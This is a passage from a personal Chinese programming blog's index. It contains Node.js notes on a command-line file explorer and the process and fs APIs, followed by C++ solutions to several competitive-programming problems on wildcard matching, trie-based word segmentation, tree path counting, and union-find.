filesArr) &#123; files = filesArr; console.log(''); if (!files.length) &#123; return console.log(' \\033[31m No files to show!\\033[39m\\n'); &#125; console.log(' Select which file or directory you want to see\\n'); file(0); &#125;); 处理输入的事件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273var fs = require('fs'), stdin = process.stdin, stdout = process.stdout, //书上的教程默认在上一个函数中定义的所有参数可以在下一个函数中自由使用，实际说明不可以 files = [], filename, stats = [];fs.readdir(process.cwd(), function (err, filesArr) &#123; files = filesArr; console.log(''); if (!files.length) &#123; return console.log(' \\033[31m No files to show!\\033[39m\\n'); &#125; console.log(' Select which file or directory you want to see\\n'); file(0);&#125;);function file(i) &#123; //过多嵌套会使得程序可读性变差，因此分离出读取函数 filename = files[i]; fs.stat(__dirname + '/' + filename, function (err, stat) &#123; stats[i] = stat; if (stat.isDirectory()) &#123; console.log(' ' + i + ' \\033[36m' + filename + '/\\033[39m'); &#125; else &#123; console.log(' ' + i + ' \\033[90m' + filename + '\\033[39m'); &#125; if (++i == files.length) &#123; read(); &#125; else &#123; file(i); &#125; &#125;);&#125;function read() &#123; console.log(''); process.stdout.write(' \\033[33mEnter your choice: \\033[39m'); process.stdin.resume(); process.stdin.setEncoding('utf8'); stdin.on('data', option);//监听data事件(继承了eventEmitter事件)，并且设置监听函数为option&#125;function option(data) &#123; //检查函数，检查是否命中下标 if (!files[Number(data)]) &#123; /** * 1. 这里可以使用files，在其作用域范围内 (fs.readdir函数的回调函数的一部分) * 2. Number(var) 强制转换 */ stdout.write(' \\033[31Enter your choice: \\033[39m'); &#125; else &#123; stdin.pause();//将流暂停(回到默认状态) if (stats[Number(data)].isDirectory()) &#123; fs.readdir(__dirname + '/' + filename, function(err, files) &#123; console.log(''); console.log(' (' + files.length + ' files)'); files.forEach(function (file) &#123; console.log(' - ' + file); &#125;); console.log(''); &#125;) &#125; else &#123; fs.readFile(__dirname + '/' + filename, 'utf8', function (err, data) &#123; console.log(''); console.log('\\033[90m' + data.replace(/(.*)/g, ' $1') + '\\033[39m');//正则表达式添加一些辅助缩进 &#125;); &#125; &#125;&#125; 反思 - CLI的一些常用接口argv process.argv 所有node程序运行时的参数值 1console.log(process.argv);// 除去两个常用参数 =&gt; process.argv.slice(2) 12345[ &apos;C:\\\\Program Files\\\\nodejs\\\\node.exe&apos;, &apos;C:\\\\Users\\\\v25bh\\\\Desktop\\\\node.js\\\\nodejs-note\\\\file-explorer\\\\example.js&apos;, &apos;temp&apos;] 工作目录 1__dirname //执行文件在文件系统中所在的目录 1process.cwd() //获取当前目录 1process.chdir(&apos;/&apos;) //灵活改变目录 环境变量 1process.env //访问shell环境下的变量 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&#123; ALLUSERSPROFILE: 'C:\\\\ProgramData', APPDATA: 'C:\\\\Users\\\\v25bh\\\\AppData\\\\Roaming', 'asl.log': 'Destination=file', CLASSPATH: '.;C:\\\\Program Files\\\\Java\\\\jdk1.8.0_131\\\\lib\\\\dt.jar;C:\\\\Program Files\\\\Java\\\\jdk1.8.0_131\\\\lib\\\\tools.jar;', CommonProgramFiles: 'C:\\\\Program Files\\\\Common Files', 'CommonProgramFiles(x86)': 'C:\\\\Program Files (x86)\\\\Common Files', CommonProgramW6432: 'C:\\\\Program Files\\\\Common Files', COMPUTERNAME: 'LAPTOP-TLHLP7T6', ComSpec: 'C:\\\\WINDOWS\\\\system32\\\\cmd.exe', configsetroot: 'C:\\\\WINDOWS\\\\ConfigSetRoot', DriverData: 'C:\\\\Windows\\\\System32\\\\Drivers\\\\DriverData', FPS_BROWSER_APP_PROFILE_STRING: 'Internet Explorer', FPS_BROWSER_USER_PROFILE_STRING: 'Default', HOMEDRIVE: 'C:', HOMEPATH: '\\\\Users\\\\v25bh', JAVA_HOME: 'C:\\\\Program Files\\\\Java\\\\jdk1.8.0_131', LOCALAPPDATA: 'C:\\\\Users\\\\v25bh\\\\AppData\\\\Local', LOGONSERVER: '\\\\\\\\LAPTOP-TLHLP7T6', NUMBER_OF_PROCESSORS: '8', OneDrive: 'C:\\\\Users\\\\v25bh\\\\OneDrive', OneDriveConsumer: 'C:\\\\Users\\\\v25bh\\\\OneDrive', OS: 'Windows_NT', Path: 'C:\\\\Program Files (x86)\\\\Common Files\\\\Oracle\\\\Java\\\\javapath;C:\\\\Windows\\\\system32;C:\\\\Windows;C:\\\\Windows\\\\System32\\\\Wbem;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\;C:\\\\Windows\\\\System32\\\\OpenSSH\\\\;C:\\\\Program Files (x86)\\\\NVIDIA Corporation\\\\PhysX\\\\Common;C:\\\\Program Files\\\\NVIDIA Corporation\\\\NVIDIA NvDLISR;D:\\\\Git\\\\cmd;D:\\\\php-7.3.10-Win32-VC15-x64;E:\\\\MaINECRAFT\\\\WorldPainter;D:\\\\php-7.3.10-Win32-VC15-x64\\\\php.exe;C:\\\\Program Files\\\\Java\\\\jdk1.8.0_131\\\\bin;C:\\\\Program Files\\\\Java\\\\jdk1.8.0_131\\\\jre\\\\bin;C:\\\\WINDOWS\\\\system32;C:\\\\WINDOWS;C:\\\\WINDOWS\\\\System32\\\\Wbem;C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\;C:\\\\WINDOWS\\\\System32\\\\OpenSSH\\\\;C:\\\\Program Files\\\\MySQL\\\\MySQL Shell 8.0\\\\bin\\\\;C:\\\\Users\\\\v25bh\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps;C:\\\\Python27;C:\\\\Python27\\\\Scripts;C:\\\\Users\\\\v25bh\\\\AppData\\\\Roaming\\\\npm;D:\\\\phpstorm\\\\PhpStorm 2019.2.4\\\\bin;D:\\\\Microsoft VS Code\\\\bin;C:\\\\Program Files\\\\Java\\\\jre1.8.0_221\\\\bin;D:\\\\Vagrant\\\\bin;C:\\\\Program Files\\\\PuTTY\\\\;C:\\\\Program Files\\\\dotnet\\\\;C:\\\\Program Files\\\\Microsoft SQL Server\\\\130\\\\Tools\\\\Binn\\\\;C:\\\\Program Files\\\\Microsoft SQL Server\\\\Client SDK\\\\ODBC\\\\170\\\\Tools\\\\Binn\\\\;C:\\\\Program Files\\\\nodejs\\\\;C:\\\\Program Files\\\\MySQL\\\\MySQL Shell 8.0\\\\bin\\\\;C:\\\\Users\\\\v25bh\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps;C:\\\\Python27;C:\\\\Python27\\\\Scripts;D:\\\\phpstorm\\\\PhpStorm 2019.2.4\\\\bin;;D:\\\\Microsoft VS Code\\\\bin;C:\\\\Users\\\\v25bh\\\\AppData\\\\Roaming\\\\Composer\\\\vendor\\\\bin;C:\\\\Users\\\\v25bh\\\\AppData\\\\Roaming\\\\npm', PATHEXT: '.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL', PhpStorm: 'D:\\\\phpstorm\\\\PhpStorm 2019.2.4\\\\bin;', PROCESSOR_ARCHITECTURE: 'AMD64', PROCESSOR_IDENTIFIER: 'Intel64 Family 6 Model 158 Stepping 10, GenuineIntel', PROCESSOR_LEVEL: '6', PROCESSOR_REVISION: '9e0a', ProgramData: 'C:\\\\ProgramData', ProgramFiles: 'C:\\\\Program Files', 'ProgramFiles(x86)': 'C:\\\\Program Files (x86)', ProgramW6432: 'C:\\\\Program Files', PROMPT: '$P$G', PSModulePath: 'C:\\\\Users\\\\v25bh\\\\Documents\\\\WindowsPowerShell\\\\Modules;C:\\\\Program Files\\\\WindowsPowerShell\\\\Modules;C:\\\\WINDOWS\\\\system32\\\\WindowsPowerShell\\\\v1.0\\\\Modules', PUBLIC: 'C:\\\\Users\\\\Public', SESSIONNAME: 'Console', SystemDrive: 'C:', SystemRoot: 'C:\\\\WINDOWS', TEMP: 'C:\\\\Users\\\\v25bh\\\\AppData\\\\Local\\\\Temp', TMP: 'C:\\\\Users\\\\v25bh\\\\AppData\\\\Local\\\\Temp', USERDOMAIN: 'LAPTOP-TLHLP7T6', USERDOMAIN_ROAMINGPROFILE: 'LAPTOP-TLHLP7T6', USERNAME: 'v25bh', USERPROFILE: 'C:\\\\Users\\\\v25bh', VAGRANT_HOME: 'C:\\\\Users\\\\v25bh\\\\.vagrant.d', VBOX_MSI_INSTALL_PATH: 'D:\\\\vitualbox\\\\', VS110COMNTOOLS: 'D:\\\\visual studio express2012\\\\Common7\\\\Tools\\\\', windir: 'C:\\\\WINDOWS'&#125; 退出 1process.exit(number); //number: 提供一个退出代码 ( 可以接在console.error(str);之后 ) 进程信号 1234process.on(&apos;SIGKILL&apos;, function()&#123; //node程序是通过在process对象上以事件分发的形式发送信号 //e.g: SIGKILL是一个进程终止的信号&#125;) ANSI转义码 在文本终端下控制格式，颜色以及其他输出选项 1放个博客总结(https://blog.csdn.net/vivian_wanjin/article/details/82930308) fs的一些接口 1fs.createReadStream('filepath'); 对比： 123456789101112131415161718var fs = require(&apos;fs&apos;);fs.readFile(&apos;file.txt&apos;, function(err, contents) &#123; //do sth console.log(&apos;readFile(): &apos; + contents);&#125;);//分段之后对大文件(日志 / 视频)的处理能力增强var stream = fs.createReadStream(&apos;file.txt&apos;);var data = &apos;&apos;;stream.on(&apos;data&apos;, function(chunk) &#123; //处理一部分内容，例如: data += chunk; data += chunk; console.log(&quot;chunk&quot;);&#125;)stream.on(&apos;end&apos;, function(chunk) &#123; //文件读取完毕 console.log(data + &quot; 最后一截chunk是空的 &quot; + chunk);&#125;) 1fs.watchFile() //监视文件 123456789101112var fs = require('fs');//fs的同步方法var files = fs.readdirSync(process.cwd());files.forEach( function (file) &#123; //寻找以css为后缀的文件，如果更改就输出文件名 if(/\\.css/.test(file)) &#123; //一直运行的检测方法，如果改动就会触发事件 fs.watchFile(process.cwd() + '/' + file, function() &#123; console.log(' - ' + file + ' changed'); &#125;); &#125;&#125;);","tags":[{"name":"node","slug":"node","permalink":"https://v25bh145.github.io/tags/node/"},{"name":"《了不起的Node JS 将JavaScript进行到底》","slug":"《了不起的Node-JS-将JavaScript进行到底》","permalink":"https://v25bh145.github.io/tags/%E3%80%8A%E4%BA%86%E4%B8%8D%E8%B5%B7%E7%9A%84Node-JS-%E5%B0%86JavaScript%E8%BF%9B%E8%A1%8C%E5%88%B0%E5%BA%95%E3%80%8B/"}]},{"title":"Question-P2536","date":"2020-03-02T08:52:34.000Z","path":"2020/03/02/coding/questions/Question-P2536/","text":"题目描述科学家们在Samuel星球上的探险仍在继续。非常幸运的，在Samuel星球的南极附近，探险机器人发现了一个巨大的冰湖！机器人在这个冰湖中搜集到了许多RNA片段运回了实验基地。 科学家们经过几个昼夜的研究，发现这些RNA片段中有许多是未知的病毒！ 每个RNA片段都是由A、C、T、G组成的序列。科学家们也总结出了Samuel星球上的“病毒模版片段”。一个模版片段是由A、C、T、G的序列加上通配符 * 和 ? 来表示。其中 * 的意思是可以匹配上0个或任意多个字符，而 ? 的意思是匹配上任意一个字母。 如果一个RNA片段能够和“病毒模版片段”相匹配，那么这个RNA片段就是未知的病毒。 例如，假设“病毒模版片段”为A*G?C。RNA片段：AGTC，AGTGTC都是未知的病毒，而RNA片段AGTGC则不是病毒。 由于，机器人搜集的这些RNA片段中除去病毒的其他部分都具有非常高的研究价值。所以科学家们希望能够分辨出其中哪些RNA片段不是病毒，并将不是病毒的RNA片段运回宇宙空间站继续进行研究。 科学家将这项任务交给了小联。现在请你为小联编写程序统计哪些RNA片段不是病毒。 输入格式第一行有一个字符串，由A、C、T、G、*、? 组成。表示“病毒模版片段”。“病毒模版片段”的长度不超过1000。第二行有一个整数N（0 &lt; N &lt; 500），表示机器人搜集到的RNA片段的数目。随后的N行，每一行有一个字符串，由A、C、T、G组成，表示一个RNA片段。每个RNA片段的长度不超过500。注意：“病毒模版片段”和RNA片段的长度都至少为1。 输出格式只有一行输出，为整数M，即不是病毒的RNA片段的数目。 输入输出样例输入 #1A*G?C 3 AGTC AGTGTC AGTGC输出 #11说明/提示输入中的RNA片段AGTGC不是病毒。 听歌儿 大爱凉风~ 解看似紫题，实则水题 其实只是因为咱发现了独特的解法 一看数据范围，哇，500 (wushiling wwwww) 这次应该打暴力了 *用于分割字符串，那咱干脆就把字符串分开算了： 建立字符串的一维数组和一个处理数据的临时字符栈，扫描输入的字符串，见到字符就放到栈里，见到*就全部出栈，放到字符串数组下标len的字符串里，然后len++ 当然咱还得处理俩特殊情况： *开头 *连续出现，中间没有字符分割 这俩情况咱if特判一下就好啦 然后就该读入测试数据了： 咱就让每个测试字符串依次通过目标字符串们(目标字符串由*断开)的审核，如果通过了就消掉前面通过的部分，如果没通过就出来，不匹配 同时这种测试可以贪心解决，在同一个测试字符串中对于同一个目标字符串，最先匹配到(这里的先指的是字符顺序优先，咱匹配肯定是按照字符顺序扫描着来的嘛)的必然是最优解(而不是唯一最优解，这里说明) 然后是匹配(每一个目标字符串匹配一次)的问题： 咱可以使用并行来匹配，就像VScode匹配选中的字符一样(没错就是这里给了我灵感) 先过第一个目标字符串的字符，扫描测试字符串里所有的该字符，按优先度(以顺序优先，也同时完成了暗中的贪心必备排序)存上位置 目标字符串里的字符一个一个过，每过一个字符就遍历一遍还在字符串里的字符，判断那个字符的下一个字符是不是这个目标字符串里的字符，是则位置+1，否则踢出数组 最后导致结束的两种情况： 数组空了 目标字符串进行匹配完了 第一种情况则匹配失败，第二种情况则匹配成功，取最前面完成匹配的数组的位置(也就是位置存值最小的地方)，断掉之前的所有元素，继续换下一个目标字符串进行 很完美的解法咯，最后我想到数组可以换成链表就可以解决删除数组元素复杂度太大的问题了，这里就变成了线性复杂度而非平方(ps：可惜写链表老是RE错误，暴力数组却过了所以这里的优化也许是没有必要的哈哈哈哈哈哈) 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; using namespace std; int n, dictLen = 0, dictLenSingle[1000], ans = 0; char sAll[1050]; char stmp[505]; char dict[1050][1050]; //根据*来划分目标字符串 void Build() { int len = strlen(sAll), tmpl = 0; for(int i = 0; i &lt; len; i++) { //这俩if就是特判啦 if(i == 0 &amp;&amp; sAll[i] == &apos;*&apos;) continue; if(sAll[i] == &apos;*&apos; &amp;&amp; sAll[i - 1] == &apos;*&apos;) continue; if(sAll[i] != &apos;*&apos;) dict[dictLen][tmpl++] = sAll[i]; else { dictLenSingle[dictLen++] = tmpl; tmpl = 0; } } if(tmpl != 0) { dictLenSingle[dictLen++] = tmpl; tmpl = 0; } } //对应一个测试字符串和目标字符串数组(目标字符串们) int Exam(char tmps[], int k, int st, int ed) { //你瞧这暴力的开空间 int* pos = new int[ed - st + 1]; int posLen = 0, res = ed; for(int i = 0; i &lt; ed - st + 1; i++) pos[i] = 0; for(int i = 0; i &lt; dictLenSingle[k]; i++) { if(i == 0) { for(int j = st; j &lt; ed - dictLenSingle[k] + 1; j++) if(tmps[j] == dict[k][0] || dict[k][0] == &apos;?&apos;) pos[posLen++] = j; continue; } for(int j = 0; j &lt; posLen; j++) if(pos[j] != -1) { if(tmps[pos[j] + 1] == dict[k][i] || dict[k][i] == &apos;?&apos;) pos[j]++; //你瞧这暴力的置空 else pos[j] = -1; } } for(int i = 0; i &lt; posLen; i++) if(pos[i] != -1) //你瞧这暴力的判定 res = res &lt; pos[i] ? res : pos[i]; return res; } bool Judge(char tmps[]) { int st = 0, ed = strlen(tmps); for(int i = 0; i &lt; dictLen; i++) { st = Exam(tmps, i, st, ed); if(st == ed) return false; } return true; } int main() { scanf(&quot;%s&quot;, sAll); Build(); scanf(&quot;%d&quot;, &amp;n); for(int i = 1; i &lt;= n; i++) { scanf(&quot;%s&quot;, stmp); if(!Judge(stmp)) ans++; } printf(&quot;%d&quot;, ans); }时间复杂度分析我用的是数组嘛，但是我把那里的时间复杂度也缩短到了线性,因为我在删除的时候根本没有移位 (就是常数远远大于链表哈哈哈) 前面构建目标数组们： $$ O( N_{目标字符串们的总长} ) (N &lt; 1000) $$ 后面单个个测试字符串的测试时间： $$ O( N_{分隔符的个数} * ( N_{目前测试字符串长度} + N_{这个目标字符串长度} * N_{第一个目标字符匹配到相等的测试字符的数量} ) ) $$ 俩一加，得到： $$ O( N_{分隔符的个数} * ( N_{目前测试字符串长度} + N_{这个目标字符串长度} * N_{第一个目标字符匹配到相等的测试字符的数量} ) ) $$$$ = O( N_{分隔符的个数} * N_{目前测试字符串长度} + N_{分隔符的个数} * N_{这个目标字符串长度} * N_{第一个目标字符匹配到相等的测试字符的数量} ) $$$$ = O( N_{分隔符的个数} * N_{目前测试字符串长度} + N_{目标字符串们的总长} * N_{第一个目标字符匹配到相等的测试字符的数量} ) $$ 按照随机的原则: $$ N_{第一个目标字符匹配到相等的测试字符的数量} \\approx N_{一个测试字符串长度} / 4 $$ 最后乘上个测试字符串的个数： $$ O( N_{目标字符串们的总长} * N_{一个测试字符串长度} * N_{测试字符串的个数} ) $$ 差不多就是 1000 * 500 * 500，2.5E8是够的，实际的数字比这个小好多(有除以4呢) 如果我们用链表，那么常数就更小更小咯，不过这已经足够了 (为什么我动态链表RE了！QAQ)","tags":[{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"暴力","slug":"暴力","permalink":"https://v25bh145.github.io/tags/%E6%9A%B4%E5%8A%9B/"}]},{"title":"Question-P2292","date":"2020-02-27T12:44:53.000Z","path":"2020/02/27/coding/questions/Question-P2292/","text":"P2292题目描述标点符号的出现晚于文字的出现，所以以前的语言都是没有标点的。现在你要处理的就是一段没有标点的文章。 一段文章T是由若干小写字母构成。一个单词W也是由若干小写字母构成。一个字典D是若干个单词的集合。我们称一段文章T在某个字典D下是可以被理解的，是指如果文章T可以被分成若干部分，且每一个部分都是字典D中的单词。 例如字典D中包括单词{‘is’, ‘name’, ‘what’, ‘your’}，则文章‘whatisyourname’是在字典D下可以被理解的，因为它可以分成4个单词：‘what’, ‘is’, ‘your’, ‘name’，且每个单词都属于字典D，而文章‘whatisyouname’在字典D下不能被理解，但可以在字典D’=D+{‘you’}下被理解。这段文章的一个前缀‘whatis’，也可以在字典D下被理解，而且是在字典D下能够被理解的最长的前缀。 给定一个字典D，你的程序需要判断若干段文章在字典D下是否能够被理解。并给出其在字典D下能够被理解的最长前缀的位置。 输入格式输入文件第一行是两个正整数n和m，表示字典D中有n个单词，且有m段文章需要被处理。之后的n行每行描述一个单词，再之后的m行每行描述一段文章。 其中1&lt;=n, m&lt;=20，每个单词长度不超过10，每段文章长度不超过1M。 输出格式对于输入的每一段文章，你需要输出这段文章在字典D可以被理解的最长前缀的位置。 输入输出样例输入 #1复制4 3isnamewhatyourwhatisyournamewhatisyounamewhaisyourname 输出 #1复制14 （整段文章’whatisyourname’都能被理解）6 （前缀’whatis’能够被理解）0 （没有任何前缀能够被理解） 听音乐 解一个非常有意思的字符串问题 (这道题有个有趣的灵魂) 从单词和小写来看，这题一定是需要建立字典树的，之后怎么办呢？ 错解我们可以针对字符文本来创一个栈，逐字扫描入栈，如果栈里的字符构成了个单词，就全部请出去继续扫描，如果栈里的字符长于字典树匹配的最长单词，这段文字就不可翻译 但是这样做会出现个问题：目前选择的单词并不是最优解 何来此言？举个例子： 就拿测试数据举例子： 4 3 whatis what your name whatisyourname我们如果单纯进行扫描入栈的操作，会在进行到what这儿判定为一个单词，请出栈，然后i打头莫得单词，直接判定为不可翻译 所以这样的线性算法是行不通的 等等，你刚刚说了最优解对吧？！！ 正解我们需要一个最优选择，使得我们可以完美选择字典的单词来翻译 反转思维来考虑这种问题，已知前面的文段已经被正确翻译，如何来解下面的翻译问题？ 思路1 -dfs我们需要遍历所有这个字符的单词，判定这个字符能达到哪些单词，然后再从这个字符的下一个字符出发，看能达到哪些单词，如果有成功达到终点的单词，就结束 思路2 -动态规划我们可以依次遍历这个文本，如果字符可以达到就遍历这个字符的下个字符开头的所有单词，将能达到的点设为可以达到状态，然后继续扫描 (只要能到达那个地方) 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; using namespace std; int root = 0, length = 1, n, m; struct TrieNode { int child[26]; bool isWord; }tree[2200]; inline void Add(string s) //添加单词到字典 { int x = root; for(int i = 0; i &lt; s.length(); i++) { if(tree[x].child[s[i] - &apos;a&apos;] == 0) { length++; tree[x].child[s[i] - &apos;a&apos;] = length; } x = tree[x].child[s[i] - &apos;a&apos;]; } tree[x].isWord = true; } char tmpWord[15], tmpText[1000050]; string tmpS; int maxLen; bool canReach[1000050]; inline void Find(string text) //重头戏来了：动态规划的扫描 { //进行初始化 maxLen = -1; for(int i = 0; i &lt; text.length(); i++) canReach[i] = false; //初始化第一个字符能达到的点 for(int i = 0, x = root; i &lt; text.length(); i++) { if(tree[x].child[text[i] - &apos;a&apos;] == 0) break; x = tree[x].child[text[i] - &apos;a&apos;]; if(tree[x].isWord) canReach[i] = true; } //沿着字符扫描文本 for(int i = 0; i &lt; text.length(); i++) { //走不到就溜 if(!canReach[i]) continue; //走到了就遍历以下一个字符开头能到达的所有点 //放到字典树就是遍历一遍那条边，如果是个单词就设置为可以达到 maxLen = i; for(int j = i + 1, x = root; j &lt; text.length(); j++) { if(tree[x].child[text[j] - &apos;a&apos;] == 0) break; x = tree[x].child[text[j] - &apos;a&apos;]; if(tree[x].isWord) canReach[j] = true; } } } int main() { scanf(&quot;%d%d&quot;, &amp;n, &amp;m); for(int i = 1; i &lt;= n; i++) { scanf(&quot;%s&quot;, tmpWord); tmpS = string(tmpWord); Add(tmpS); } for(int i = 1; i &lt;= m; i++) { scanf(&quot;%s&quot;, tmpText); tmpS = string(tmpText); Find(tmpS); printf(&quot;%d\\n&quot;, maxLen + 1); } }最后动态规划具有最优子结构和无后效性 一开始我居然使用的是dfs，失误失误QAQ (果然我对动态规划还是理解不深呢) (逃)","tags":[{"name":"动态规划","slug":"动态规划","permalink":"https://v25bh145.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"},{"name":"Question","slug":"Question","permalink":"https://v25bh145.github.io/tags/Question/"},{"name":"字典树","slug":"字典树","permalink":"https://v25bh145.github.io/tags/%E5%AD%97%E5%85%B8%E6%A0%91/"}]},{"title":"Question-CF979C","date":"2020-02-19T08:10:24.000Z","path":"2020/02/19/coding/questions/Question-CF979C/","text":"CF979C Kuro and Walking Route题目描述Kuro is living in a country called Uberland, consisting of n towns, numbered from 1 to n , and n - 1 bidirectional roads connecting these towns. It is possible to reach each town from any other. Each road connects two towns a and b . Kuro loves walking and he is planning to take a walking marathon, in which he will choose a pair of towns (u, v) (u != v)​ and walk from uu using the shortest path to v (note that (u, v) is considered to be different from (v, u) . Oddly, there are 2 special towns in Uberland named Flowrisa (denoted with the index x ) and Beetopia (denoted with the index y ). Flowrisa is a town where there are many strong-scent flowers, and Beetopia is another town where many bees live. In particular, Kuro will avoid any pair of towns (u, v) if on the path from u to v , he reaches Beetopia after he reached Flowrisa, since the bees will be attracted with the flower smell on Kuro’s body and sting him. Kuro wants to know how many pair of city (u, v) he can take as his route. Since he’s not really bright, he asked you to help him with this problem. 输入格式The first line contains three integers n ($1 &lt;= n &lt;= 3 * 10 ^ {5}$) , x and y ($1 &lt;= x,y &lt;= n$)- the number of towns, index of the town Flowrisa and index of the town Beetopia, respectively. n - 1lines follow, each line contains two integers a and b​, describes a road connecting two towns a and b . It is guaranteed that from each town, we can reach every other town in the city using the given roads. That is, the given map of towns and roads is a tree. 输出格式A single integer resembles the number of pair of towns (u, v) that Kuro can use as his walking route. 题意翻译n 个结点，编号从 1 到 n ， n−1 条双向边的连通图，问图中有多少点对 (u,v) 使得从 u 到 v 的最短路上，不存在先到达 x ，再到达 y 的情况。点对 (u,v) 与点对 (v,u) 被认为是不同的。 听歌 解分析n个节点，n - 1条边，每一个节点都有边与之相连，可以判断出来是一棵树 我们可以利用容斥把题的意思翻转一下，点之间的最短路径总数(n * n - n) = 先到x再到y的情况 + 不是先到x再到y的情况因此题意就变成了 求两点之间的最短路径中，先到x再到y的情况 模拟我们先画一个简单的树出来 设起始点是3，终点是5，3到5的最短路径是 3 -&gt; 4 -&gt; 5 我们可以由起点和终点把树划分为三个点集 第一个集包含了由起点到终点的最短路径中所经过的点(不包含起始和终点)第二个集包含了起点，集合内的点互相联通且与第一个集的交集为空第三个集包含了终点，集合内的点互相联通且与第一个集的交集为空 举个例子，图中第一个集合就是4，第二个集合就是1, 2, 3，第三个集合就是5, 6, 7 可以看出来，先到x再到y的最短路径的总和 = 第二个集合的基数 * 第三个集合的基数 算法思路这就好做多了，我们可以两边dfs分别求集合。 这里我们依然采用容斥 第一次dfs 我们可算出第一个集合与第二个集合的基数之和(从起点dfs，终止条件是 vis1[n] 或 n == ed) 第二次dfs 我们可算出第三个集合的基数与第二个集合的基数(从终点dfs，终止条件是vis2[n]或 n == st) 另外： 当遍历到的点属于第一次dfs的点的集合时 (确切的说，是处于第一集合与第二集合的并集中，且由于遍历以起始点作为终点，所以我们不会遍历到第一集合的点，所以结论是这些点就属于第二集合的点，且这些点的集合就是第二集合) ，我们可以用第一次计算到的基数之和减去这些点的集合的基数，得到的就是第一集合的基数 当遍历到的点不属于第一次dfs的点的集合时，这个点就属于第三集合，且这些点的集合就是第三集合 用图来解释一下： 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; #define N 300050 using namespace std; int h[N], n, st, ed, length; long long ans, cnt1 = 0, cnt2 = 0; bool vis1[N], vis2[N]; struct Edge { int next, to; }edge[2 * N];//要注意啊，无向图装配两次所以要开两倍qwq void Equip(int x, int y) { length++; edge[length].to = y; edge[length].next = h[x]; h[x] = length; } void dfs1(int x) { if(vis1[x] || x == ed) return; cnt1++; vis1[x] = true; for(int e = h[x]; e; e = edge[e].next) if(!vis1[edge[e].to]) dfs1(edge[e].to); } void dfs2(int x) { if(vis2[x] || x == st) return; if(vis1[x]) cnt1--; else cnt2++; vis2[x] = true; for(int e = h[x]; e; e = edge[e].next) if(!vis2[edge[e].to]) dfs2(edge[e].to); } int main() { scanf(&quot;%d%d%d&quot;, &amp;n, &amp;st, &amp;ed); ans = 1ll * n * n - n; //1ll :表示数据类型为long long，数据值为1的常量 int tmp1, tmp2; for(int i = 1; i &lt;= n - 1; i++) { scanf(&quot;%d%d&quot;, &amp;tmp1, &amp;tmp2); Equip(tmp1, tmp2); Equip(tmp2, tmp1); } dfs1(st); dfs2(ed); ans -= cnt1 * cnt2; printf(&quot;%lld&quot;, ans); }##虽然是好简单一道题但是还是为了写写容斥而且英文题看着好装逼啊虽然看着翻译做的哈哈哈哈就放上来了哈哈哈哈哈哈","tags":[{"name":"容斥","slug":"容斥","permalink":"https://v25bh145.github.io/tags/%E5%AE%B9%E6%96%A5/"},{"name":"搜索","slug":"搜索","permalink":"https://v25bh145.github.io/tags/%E6%90%9C%E7%B4%A2/"}]},{"title":"Question-P1197","date":"2020-02-16T07:39:35.000Z","path":"2020/02/16/coding/questions/Question-P1197/","text":"P1197题目描述很久以前，在一个遥远的星系，一个黑暗的帝国靠着它的超级武器统治着整个星系。 某一天，凭着一个偶然的机遇，一支反抗军摧毁了帝国的超级武器，并攻下了星系中几乎所有的星球。这些星球通过特殊的以太隧道互相直接或间接地连接。 但好景不长，很快帝国又重新造出了他的超级武器。凭借这超级武器的力量，帝国开始有计划地摧毁反抗军占领的星球。由于星球的不断被摧毁，两个星球之间的通讯通道也开始不可靠起来。 现在，反抗军首领交给你一个任务：给出原来两个星球之间的以太隧道连通情况以及帝国打击的星球顺序，以尽量快的速度求出每一次打击之后反抗军占据的星球的连通块的个数。（如果两个星球可以通过现存的以太通道直接或间接地连通，则这两个星球在同一个连通块中）。 输入格式输入文件第一行包含两个整数，n, m，分别表示星球的数目和以太隧道的数目。星球用 0 ∼ n−1 的整数编号。 接下来的 m 行，每行包括两个整数 x,y，表示星球 x 和星球 y 之间有 “以太” 隧道，可以直接通讯。 接下来的一行为一个整数 k ，表示将遭受攻击的星球的数目。 接下来的 k 行，每行有一个整数，按照顺序列出了帝国军的攻击目标。这 k 个数互不相同，且都在 0 到 n-1 的范围内。 输出格式第一行是开始时星球的连通块个数。接下来的 k 行，每行一个整数，表示经过该次打击后现存星球的连通块个数。 输入输出样例输入8 13 0 1 1 6 6 5 5 0 0 6 1 2 2 3 3 4 4 5 7 1 7 2 7 6 3 6 5 1 6 3 5 7输出1 1 1 2 3 3说明/提示【数据范围】对于 100% 的数据，1 &lt; m &lt; $2*10^{5}$ , 1 &lt; n &lt; 2m (JSOI2008) 听歌 白箱真好看 解首先想到的是动态的并查集，允许删除操作，在毁灭星球的时候删除依赖这个星球交互的行星，但是并查集只支持一个无序集合，并没有支持元素之间联系的线段 看来只剩更改并查集这个数据结构了？ 在毁灭星球的时候，星球之间的边也随之毁灭，我们需要记下来每个星球的边，考虑到是个稀疏图，可以用邻接表存边 然后我们需要根据边数实时建立起多个集合，实在是太麻烦了 然后把思维逆转一下，不用“实时”的操作，也就是offline操作，可以把“毁灭”变为“建立”，也就可以使用并查集动态从后向前维护了 具体思路是这样子： 将没有被(不会被)毁灭的行星放到一个并查集 –初始化操作 倒序录入已经毁灭的行星与已经毁灭的行星与未被毁灭的行星的关系 将集合的个数作为结果存入那一次毁灭之前的答案中 ps: 集合的个数可以用并查集中的边数表示，算法类似于最小生成树kruskal 当然输出的结果是倒序，我们还需要存储个结果，反向输出 代码//Madoka daisuki!!! #include&lt;bits/stdc++.h&gt; #define N 400050 #define M 200050 using namespace std; int n, m, h[N], km = 0, arrayK[N], k, current = 0, ans[N], father[N]; bool del[N]; //并查集素质三连 int Find(int x) { if(father[x] != x) father[x] = Find(father[x]); return father[x]; } void Union(int x, int y){father[Find(x)] = Find(father[y]);} bool Judge(int x, int y){return Find(x) == Find(y);} //前向星存图 struct Edge{int toN, nextE, 